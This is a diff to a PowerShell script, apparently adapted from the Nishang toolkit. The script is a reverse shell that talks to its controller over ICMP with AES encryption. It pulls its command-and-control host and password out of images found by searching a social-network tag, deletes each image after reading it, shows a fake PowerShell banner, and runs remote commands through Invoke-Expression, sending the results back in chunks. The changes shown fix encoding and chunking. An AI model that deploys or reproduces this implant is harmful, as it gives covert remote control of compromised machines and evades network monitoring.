@@ -74,12 +74,12 @@ https://github.com/samratashok/nishang
     $opt.DontFragment = $true
 
     # online
-    $buf = $aes.Encrypt([Text.Encoding]::ASCII.GetBytes("online:" + $uid))
+    $buf = $aes.Encrypt([Text.Encoding]::UTF8.GetBytes("online:" + $uid))
     $reply = $icmp.Send($IPAddress, $timeout, $buf, $opt)
     if ($reply.Buffer)
     {
         $response = $aes.Decrypt($reply.Buffer)
-        $response = [Text.Encoding]::ASCII.GetString($response)
+        $response = [Text.Encoding]::UTF8.GetString($response)
         if ($response -ne $checksum)
         {
             # invalid client
@@ -91,56 +91,65 @@ https://github.com/samratashok/nishang
     $banner = "Windows PowerShell running as user " + $env:username + " on " + 
         $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"
 
-    $buf = $aes.Encrypt([Text.Encoding]::ASCII.GetBytes($banner))
+    $buf = $aes.Encrypt([Text.Encoding]::UTF8.GetBytes($banner))
     $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
 
     #Show an interactive PowerShell prompt
-    $sendbytes = [Text.Encoding]::ASCII.GetBytes('PS ' + (Get-Location).Path + '> ')
+    $sendbytes = [Text.Encoding]::UTF8.GetBytes('PS ' + (Get-Location).Path + '> ')
     $sendbytes = $aes.Encrypt($sendbytes)
     $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
 
     while ($true)
     {
-        $sendbytes = [Text.Encoding]::ASCII.GetBytes('')
+        $sendbytes = [Text.Encoding]::UTF8.GetBytes('')
         $sendbytes = $aes.Encrypt($sendbytes)
         $reply = $icmp.Send($IPAddress, $timeout, $sendbytes, $opt)
-        $response = $aes.Decrypt($reply.Buffer)
+        if ($reply.Buffer)
+        {
+            $response = $aes.Decrypt($reply.Buffer)
+        }
 
         # Check for Command from the server
-        if ($response.Length)
+        if ($response -and $response.Length)
         {
-            $cmd = [Text.Encoding]::ASCII.GetString($response)
+            $cmd = [Text.Encoding]::UTF8.GetString($response)
             $result = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
-            $sendbytes = [text.encoding]::ASCII.GetBytes($result)
-            $index = [Math]::Floor($sendbytes.length / $BufferSize)
-            $i = 0
 
             # split into pieces
-            if ($sendbytes.Length -gt $BufferSize)
+            if ($result.Length -gt $BufferSize)
             {
+                $index = [Math]::Floor($result.length / $BufferSize)
+                $i = 0
+
                 while ($i -lt $index)
                 {
-                    $trunk = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
-                    $buf = $aes.Encrypt($trunk)
+                    $trunk = $result.Substring($i * $BufferSize, $BufferSize)
+                    $bytes = [System.Text.Encoding]::Default.GetBytes($trunk)
+                    $utf8_bytes = [Text.Encoding]::Convert([System.Text.Encoding]::Default, [System.Text.Encoding]::UTF8, $bytes)
+                    $buf = $aes.Encrypt($utf8_bytes)
                     $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
                     $i++
                 }
 
-                $tail = $sendbytes.Length % $BufferSize
+                $tail = $result.Length % $BufferSize
                 
                 if ($tail)
                 {
-                    $trunk = $sendbytes[($i * $BufferSize)..($sendbytes.Length)]
-                    $buf = $aes.Encrypt($trunk)
+                    $trunk = $result.Substring($i * $BufferSize, $tail)
+                    $bytes = [System.Text.Encoding]::Default.GetBytes($trunk)
+                    $utf8_bytes = [Text.Encoding]::Convert([System.Text.Encoding]::Default, [System.Text.Encoding]::UTF8, $bytes)
+                    $buf = $aes.Encrypt($utf8_bytes)
                     $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
                 }
             }
             else
             {
-                $buf = $aes.Encrypt($sendbytes)
+                $bytes = [System.Text.Encoding]::Default.GetBytes($result)
+                $utf8_bytes = [Text.Encoding]::Convert([System.Text.Encoding]::Default, [System.Text.Encoding]::UTF8, $bytes)
+                $buf = $aes.Encrypt($utf8_bytes)
                 $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
             }
-            $sendbytes = [Text.Encoding]::ASCII.GetBytes("`nPS " + (Get-Location).Path + '> ')
+            $sendbytes = [Text.Encoding]::UTF8.GetBytes("`nPS " + (Get-Location).Path + '> ')
             $sendbytes = $aes.Encrypt($sendbytes)
             $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
         }
@@ -156,7 +165,7 @@ $uid = "8fd2d4d2-1385-4b66-b4da-00191f6ee044"
 # load config from social network
 Get-Images "thisisaninvisibletag" | % {
 	$buf = Read-Steg $_
-	$json = [System.Text.ASCIIEncoding]::ASCII.GetString($buf)
+	$json = [Text.Encoding]::ASCII.GetString($buf)
 	$config = ConvertFrom-Json $json
 	Remove-Item $_
     Invoke-PowerShellIcmp -IPAddress $config.host -Password $config.password -Uid $uid
